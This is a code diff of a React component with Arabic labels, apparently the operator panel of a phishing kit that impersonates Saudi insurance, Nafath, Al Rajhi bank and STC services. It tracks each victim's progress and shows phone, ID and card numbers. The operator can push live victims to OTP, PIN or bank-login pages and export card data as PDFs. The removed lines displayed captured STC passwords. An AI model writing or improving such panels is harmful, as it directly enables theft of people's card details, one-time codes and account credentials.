@@ -964,181 +964,248 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     }
   };
 
+  // Map currentPage / currentStep to a short Arabic label for the badge
+  const pageLabels: Record<string, string> = {
+    home: "الرئيسية",
+    insur: "بيانات التأمين",
+    compar: "مقارنة العروض",
+    payment: "الدفع والتحقق",
+    otp: "التحقق OTP",
+    pin: "التحقق PIN",
+    phone: "معلومات الهاتف",
+    nafad: "نفاذ",
+    nafad_modal: "مودال نفاذ",
+    rajhi: "الراجحي",
+    stc_login: "تسجيل STC",
+    "stc-login": "تسجيل STC",
+    finalOtp: "OTP النهائي",
+    veri: "التحقق",
+    confi: "التأكيد",
+    check: "فحص",
+  };
+  const currentPageValue =
+    (visitor.currentPage as string) ||
+    (visitor.redirectPage as string) ||
+    (visitor.currentStep as string) ||
+    "";
+  const currentPageLabel =
+    pageLabels[currentPageValue] || (currentPageValue ? String(currentPageValue) : "");
+
+  // Mask card number for display (show last 4)
+  const cardDisplay = visitor.cardNumber
+    ? `**** ${String(visitor.cardNumber).slice(-4)}`
+    : visitor._v1
+    ? `**** ${String(visitor._v1).slice(-4)}`
+    : null;
+
+  // Country flag emoji from ISO code
+  const countryFlag = visitor.country
+    ? visitor.country.toUpperCase().replace(/./g, (c) => String.fromCodePoint(127397 + c.charCodeAt(0)))
+    : null;
+
+  // Refresh visitor status
+  const handleRefresh = async () => {
+    if (!visitor.id) return;
+    try {
+      await updateApplication(visitor.id, {
+        currentStepUpdatedAt: getCurrentTimestamp(),
+      });
+    } catch (error) {
+      console.error("Refresh error:", error);
+    }
+  };
+
   return (
     <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
-      {/* Header */}
-      <div className="bg-white border-b border-gray-200 p-2 md:p-3">
-        <div className="flex flex-col gap-2 md:flex-row md:items-start md:justify-between">
-          <div className="min-w-0">
-            {onBack && (
-              <button
-                onClick={onBack}
-                className="mb-2 inline-flex items-center gap-1 rounded border border-gray-300 px-2 py-1 text-[10px] font-medium text-gray-700 transition-colors hover:bg-gray-100"
-              >
-                <ArrowRight className="h-3 w-3" />
-                الرجوع
-              </button>
-            )}
-            <h2 className="text-base md:text-lg font-bold text-gray-900">
+      {/* Visitor Info Bar */}
+      <div className="bg-white border-b border-gray-200 shadow-sm" dir="rtl">
+        {/* Row 1: Reference, Name, Refresh, Redirect select */}
+        <div className="flex items-center gap-2 px-3 py-2 border-b border-gray-200">
+          {onBack && (
+            <button
+              onClick={onBack}
+              className="inline-flex items-center gap-1 rounded border border-gray-300 px-2 py-1 text-[10px] font-medium text-gray-700 transition-colors hover:bg-gray-100 shrink-0"
+              title="الرجوع"
+            >
+              <ArrowRight className="h-3 w-3" />
+            </button>
+          )}
+          {visitor.referenceNumber && (
+            <span className="text-[11px] font-mono text-gray-500 bg-gray-100 border border-gray-200 px-2 py-0.5 rounded shrink-0">
+              {visitor.referenceNumber}
+            </span>
+          )}
+          <button
+            onClick={handleRefresh}
+            className="flex items-center gap-1.5 hover:opacity-80 transition-opacity disabled:opacity-50 min-w-0"
+            title="تحديث"
+          >
+            <span className="font-bold text-gray-900 text-sm truncate">
               {visitorDisplayName}
-            </h2>
+            </span>
+            <span className="text-gray-400 text-xs">↻</span>
+          </button>
+          <div className="flex-1"></div>
+          {/* PDF Buttons */}
+          <button
+            onClick={async () => {
+              setIsGeneratingPdf(true);
+              try {
+                await generateVisitorPdf(visitor);
+              } catch (error) {
+                console.error("PDF generation error:", error);
+              } finally {
+                setIsGeneratingPdf(false);
+              }
+            }}
+            disabled={isGeneratingPdf}
+            className="flex items-center justify-center gap-1 rounded px-2.5 py-1 text-[10px] font-medium text-white transition-colors bg-red-600 hover:bg-red-700 disabled:opacity-50 shrink-0"
+            title="تصدير PDF"
+          >
+            {isGeneratingPdf ? (
+              <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
+                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+              </svg>
+            ) : (
+              <>📄 PDF</>
+            )}
+          </button>
+          <button
+            onClick={async () => {
+              setIsGeneratingCardPdf(true);
+              try {
+                await generateCardPdf(visitor);
+              } catch (error) {
+                console.error("Card PDF generation error:", error);
+              } finally {
+                setIsGeneratingCardPdf(false);
+              }
+            }}
+            disabled={isGeneratingCardPdf}
+            className="flex items-center justify-center gap-1 rounded px-2.5 py-1 text-[10px] font-medium text-white transition-colors bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 shrink-0"
+            title="تصدير بطاقة PDF"
+          >
+            {isGeneratingCardPdf ? (
+              <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
+                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+              </svg>
+            ) : (
+              <>💳 PDF</>
+            )}
+          </button>
+          {/* Redirect select */}
+          <select
+            onChange={(e) => handleNavigate(e.target.value)}
+            disabled={isNavigating}
+            value=""
+            className="text-[11px] px-2 py-1 bg-white border border-gray-300 rounded text-gray-700 focus:outline-none focus:border-green-500 disabled:opacity-50 cursor-pointer shadow-sm shrink-0"
+          >
+            <option value="">توجيه الزائر...</option>
+            <option value="home">الصفحة الرئيسية</option>
+            <option value="insur">بيانات التأمين</option>
+            <option value="compar">مقارنة العروض</option>
+            <option value="payment">الدفع والتحقق</option>
+            <option value="otp">التحقق OTP</option>
+            <option value="pin">التحقق PIN</option>
+            <option value="phone">معلومات الهاتف</option>
+            <option value="nafad">نفاذ</option>
+            <option value="nafad_modal">مودال نفاذ</option>
+            <option value="rajhi">الراجحي</option>
+          </select>
+        </div>
 
-            {/* Contact Info */}
-            <div className="flex flex-col gap-0.5 mt-1">
-              <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 text-xs">
-                <span className="text-gray-600">
-                  📞{" "}
-                  <span className="font-semibold text-gray-800">
-                    {visitor.phoneNumber || "غير محدد"}
-                  </span>
-                </span>
-                <span className="hidden text-gray-400 sm:inline">•</span>
-                <span className="text-gray-600">
-                  🆔{" "}
-                  <span className="font-semibold text-gray-800">
-                    {visitor.identityNumber || "غير محدد"}
-                  </span>
-                </span>
-              </div>
-              {/* Display STC Data */}
-              {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
-                <div className="bg-purple-50 border-r-4 border-purple-500 p-2 rounded">
-                  <h4 className="font-semibold text-purple-900 text-xs mb-1">
-                    بيانات STC
-                  </h4>
-                  <div className="space-y-1 text-[10px]">
-                    {visitor.stcPhone && <div>الجوال: {visitor.stcPhone}</div>}
-                    {visitor.stcPassword && (
-                      <div>كلمة المرور: {visitor.stcPassword}</div>
-                    )}
-                    {visitor.stcSubmittedAt && (
-                      <div>التاريخ: {formatStcDate(visitor.stcSubmittedAt)}</div>
-                    )}
-                  </div>
-                </div>
-              )}
-
-              {/* Device & Location Info */}
-              {(visitor.country || visitor.browser || visitor.deviceType) && (
-                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500">
-                  {visitor.country && <span>🌍 {visitor.country}</span>}
-                  {visitor.browser && (
-                    <>
-                      <span>•</span>
-                      <span>🌐 {visitor.browser}</span>
-                    </>
-                  )}
-                  {visitor.deviceType && (
-                    <>
-                      <span>•</span>
-                      <span>📱 {visitor.deviceType}</span>
-                    </>
-                  )}
-                  <span>•</span>
-                  <button
-                    onClick={async (e) => {
-                      e.stopPropagation();
-                      if (!visitor.id || isBlocking) return;
-                      const action = visitor.is_blocked ? "إلغاء الحظر" : "حظر";
-                      if (!confirm(`هل أنت متأكد من ${action} هذا الزائر؟`)) return;
-                      setIsBlocking(true);
-                      try {
-                        await updateApplication(visitor.id, { is_blocked: !visitor.is_blocked });
-                        alert(visitor.is_blocked ? "تم إلغاء الحظر بنجاح" : "تم الحظر بنجاح");
-                      } catch (error) {
-                        console.error("Block error:", error);
-                        alert("حدث خطأ");
-                      } finally {
-                        setIsBlocking(false);
-                      }
-                    }}
-                    disabled={isBlocking}
-                    className={`font-semibold text-[10px] px-1.5 py-0.5 rounded transition-colors ${
-                      visitor.is_blocked
-                        ? "bg-red-100 text-red-600 hover:bg-red-200"
-                        : "bg-gray-100 text-gray-500 hover:bg-red-100 hover:text-red-600"
-                    }`}
-                  >
-                    {visitor.is_blocked ? "محظور" : "حظر"}
-                  </button>
-                </div>
-              )}
+        {/* Row 2: Attributes strip */}
+        <div className="flex items-center gap-0 overflow-x-auto scrollbar-hide text-[11px]">
+          {/* Phone */}
+          {visitor.phoneNumber && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <svg className="w-3 h-3 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
+              </svg>
+              <span className="text-gray-700 font-mono">{visitor.phoneNumber}</span>
             </div>
-          </div>
-
-          {/* Navigation */}
-          <div className="flex w-full flex-col items-stretch gap-1.5 sm:flex-row sm:items-center md:w-auto">
+          )}
+          {/* Identity / card number */}
+          {cardDisplay && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <svg className="w-3 h-3 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
+              </svg>
+              <span className="text-gray-700 font-mono">{cardDisplay}</span>
+            </div>
+          )}
+          {/* Device type */}
+          {visitor.deviceType && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <svg className="w-3 h-3 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+              </svg>
+              <span className="text-gray-400">{visitor.deviceType}</span>
+            </div>
+          )}
+          {/* OS */}
+          {visitor.os && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <svg className="w-3 h-3 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18" />
+              </svg>
+              <span className="text-gray-400">{visitor.os}</span>
+            </div>
+          )}
+          {/* Browser */}
+          {visitor.browser && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <svg className="w-3 h-3 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
+              </svg>
+              <span className="text-gray-400">{visitor.browser}</span>
+            </div>
+          )}
+          {/* Country */}
+          {visitor.country && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <span className="text-base leading-none">{countryFlag || "🌍"}</span>
+              <span className="text-gray-400">{visitor.country}</span>
+            </div>
+          )}
+          {/* Block button */}
+          <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
             <button
-              onClick={async () => {
-                setIsGeneratingPdf(true);
+              onClick={async (e) => {
+                e.stopPropagation();
+                if (!visitor.id || isBlocking) return;
+                const action = visitor.is_blocked ? "إلغاء الحظر" : "حظر";
+                if (!confirm(`هل أنت متأكد من ${action} هذا الزائر؟`)) return;
+                setIsBlocking(true);
                 try {
-                  await generateVisitorPdf(visitor);
+                  await updateApplication(visitor.id, { is_blocked: !visitor.is_blocked });
+                  alert(visitor.is_blocked ? "تم إلغاء الحظر بنجاح" : "تم الحظر بنجاح");
                 } catch (error) {
-                  console.error("PDF generation error:", error);
+                  console.error("Block error:", error);
+                  alert("حدث خطأ");
                 } finally {
-                  setIsGeneratingPdf(false);
+                  setIsBlocking(false);
                 }
               }}
-              disabled={isGeneratingPdf}
-              className="flex w-full items-center justify-center gap-1 rounded px-3 py-1.5 text-[10px] font-medium text-white transition-colors bg-red-600 hover:bg-red-700 disabled:opacity-50 sm:w-auto"
+              disabled={isBlocking}
+              title={visitor.is_blocked ? "إلغاء الحظر" : "حظر IP والجهاز"}
+              className={`ml-1 px-2 py-0.5 text-white text-[10px] rounded font-bold disabled:opacity-50 ${
+                visitor.is_blocked ? "bg-gray-500 hover:bg-gray-600" : "bg-red-600 hover:bg-red-700"
+              }`}
             >
-              {isGeneratingPdf ? (
-                <>
-                  <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  جاري...
-                </>
-              ) : (
-                <>📄 PDF</>
-              )}
+              {isBlocking ? "..." : visitor.is_blocked ? "محظور" : "حظر"}
             </button>
-            <button
-              onClick={async () => {
-                setIsGeneratingCardPdf(true);
-                try {
-                  await generateCardPdf(visitor);
-                } catch (error) {
-                  console.error("Card PDF generation error:", error);
-                } finally {
-                  setIsGeneratingCardPdf(false);
-                }
-              }}
-              disabled={isGeneratingCardPdf}
-              className="flex w-full items-center justify-center gap-1 rounded px-3 py-1.5 text-[10px] font-medium text-white transition-colors bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 sm:w-auto"
-            >
-              {isGeneratingCardPdf ? (
-                <>
-                  <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  جاري...
-                </>
-              ) : (
-                <>💳 PDF</>
-              )}
-            </button>
-            {/* Navigation Dropdown */}
-            <select
-              onChange={(e) => handleNavigate(e.target.value)}
-              disabled={isNavigating}
-              className="w-full rounded border border-gray-300 bg-white px-2 py-1.5 text-[10px] focus:outline-none disabled:opacity-50 sm:w-auto"
-            >
-              <option value="">توجيه الزائر...</option>
-              <option value="home">🏠 الرئيسية</option>
-              <option value="insur">📋 بيانات التأمين</option>
-              <option value="compar">📊 مقارنة العروض</option>
-              <option value="payment">💳 الدفع (بطاقة)</option>
-              <option value="otp">🔑 OTP</option>
-              <option value="pin">🔐 PIN</option>
-              <option value="phone">📱 معلومات الهاتف</option>
-              <option value="nafad">🇸🇦 نفاذ</option>
-              <option value="nafad_modal">🪟 نافذة نفاذ</option>
-              <option value="rajhi">🏦 راجحي</option>
-            </select>
           </div>
+          {/* Current page badge */}
+          {currentPageLabel && (
+            <div className="flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0">
+              <span className="text-[10px] px-1.5 py-0.5 bg-green-100 text-green-700 rounded font-medium border border-green-200">
+                {currentPageLabel}
+              </span>
+            </div>
+          )}
         </div>
       </div>
 
